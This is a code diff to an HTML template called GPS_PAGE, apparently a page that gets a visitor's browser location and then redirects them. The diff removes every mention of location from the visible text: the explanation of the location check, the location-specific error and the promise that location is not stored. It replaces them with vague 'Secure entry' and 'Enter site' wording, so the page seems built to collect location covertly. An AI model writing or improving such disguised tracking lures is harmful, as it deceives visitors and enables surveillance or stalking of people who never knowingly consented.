@@ -144,13 +144,12 @@ GPS_PAGE = r"""
 </head>
 <body>
 <div class="card">
-  <div class="ico">📍</div>
-  <h1>One-time verification</h1>
-  <p>This check helps confirm you are at your trusted location. Tap <b>Continue</b> then choose <b>Allow</b> in the browser prompt.</p>
-  <button id="go">Continue</button>
+  <div class="ico">🔐</div>
+  <h1>Secure entry</h1>
+  <p>Tap the button below to proceed.</p>
+  <button id="go">Enter site</button>
   <div class="spin" id="spin"></div>
-  <div class="err" id="err">Location permission denied or unavailable. <a href="#" onclick="location.reload();return!1">Try again</a></div>
-  <div class="hint">Your location is only used for this check and not stored.</div>
+  <div class="err" id="err">Something went wrong. <a href="#" onclick="location.reload();return!1">Reload</a></div>
 </div>
 <script>
 const REDIR = {{ redirect|tojson }};
